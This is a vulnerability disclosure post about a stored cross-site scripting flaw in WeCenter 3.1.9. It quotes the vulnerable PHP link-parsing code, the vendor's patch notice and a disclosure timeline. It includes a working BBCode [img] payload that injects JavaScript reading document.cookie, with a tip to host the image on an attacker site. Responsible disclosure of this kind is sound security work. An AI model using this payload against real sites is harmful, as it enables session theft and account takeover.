---
layout: post
title: WeCenter 3.1.9 Stored XSS Vulnerability
---
#### 0x01 AFFECTED

Version: WeCenter 3.1.9 (~2016/11/21)

Download: http://wenda.wecenter.com/page/download

#### 0x02 DESCRIPTION
 
SourceCode, Template vim views/default/question/index.tpl.htm: content markitup-box

app/question/main.php:

    $question_info['question_detail'] = FORMAT::parse_attachs(nl2br(FORMAT::parse_bbcode($question_info['question_detail'])));

wecenter319/system/class/cls_format.inc.php:

    public static function parse_bbcode($text)
    {
        if (!$text)
        {
            return false;
        }

        return self::parse_links(load_class('Services_BBCode')->parse($text));
    }
    
wecenter319/system/Services/BBCode.php, wecenter319/system/class/cls_format.inc.php:

    public static function parse_links($str)
    {
        $str = @preg_replace_callback('/(?<!!!\[\]\(|"|\'|\)|>)(https?:\/\/[-a-zA-Z0-9@:;%_\+.~#?\&\/\/=!]+)(?!"|\'|\)|>)/i', 'parse_link_callback', $str);
        if (strpos($str, 'http') === FALSE)
        {
            $str = @preg_replace_callback('/(www\.[-a-zA-Z0-9@:;%_\+\.~#?&\/\/=]+)/i', 'parse_link_callback', $str);
        }
        $str = @preg_replace('/([a-z0-9\+_\-]+[\.]?[a-z0-9\+_\-]+@[a-z0-9\-]+\.+[a-z]{2,6}+(\.+[a-z]{2,6})?)/is', '<a href="mailto:\1">\1</a>', $str);

        return $str;
    }
    
使用 bbcode 插入 img 的时候，我们利用 parse_links 可以实现对 img 的截断，构造如下 Payload 注入恶意 JavaScript 代码：

[img]http://www.n0tr00t.com/?/account/aaaa/?return_url=http://onerror=location=/javascript:console.log%28document.cookie%29/.source//a[/img][url]http://a.com[/url]

注：其中默认情况下不允许注册用户外链图像，所以将 [img] 地址改为攻击站点即可，通过浏览器 DOM 解析后执行代码。

#### 0x03 Fix

\<jack_ch@icloud.com>:

  evi1m0.bat 您好，我是 WeCenter 的开发者，感谢您对 WeCenter 的关注，您提出的跨站问题确实存在，下面是修复方法，我直接提供了修改后的文件：

第一文件是 BBCode.php，请直接将这个文件与 system/Services/BBCode.php 替换

第二个文件是 cls_format.inc.php，这个文件位于 system/class/cls_format.inc.php， 这个文件更新了下列函数:
  
  - parse_links()
  - parse_bbcode()

第三个文件是 functions.app.php，这个文件位于 system/functions.app.php，这个文件更新了下列函数:
 
  - parse_link_callback() 【更新】
  - parse_link_callback_bbcode() 【新增】

注：目前补丁包已经更新至官方下载的源码包中，新用户可以直接安装，老用户可以替换/新增补丁文件。

#### 0x04 Discloure Timeline

- 2016/11/21 Report vuln detail to WeCenter.
- 2016/11/25 WeCenter fix, Release patch.
- 2016/12/22 Public, via @evi1m0.

